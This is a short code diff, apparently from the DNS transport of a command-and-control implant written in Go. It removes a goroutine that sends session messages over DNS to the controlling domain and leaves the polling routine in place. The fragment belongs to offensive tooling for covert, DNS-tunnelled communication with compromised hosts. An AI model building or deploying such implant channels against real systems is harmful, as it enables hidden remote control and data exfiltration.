@@ -157,17 +157,6 @@ func dnsConnect() error {
 		close(ctrl)
 	}()
 
-	go func() {
-		for envelope := range send {
-			err := dnsSessionSend(dnsParent, sessionID, sessionKey, envelope)
-			if err != nil {
-				// {{if .Debug}}
-				log.Printf("Failed to send message %v\n", err)
-				// {{end}}
-			}
-		}
-	}()
-
 	go dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
 
 	handlers := getSystemHandlers()
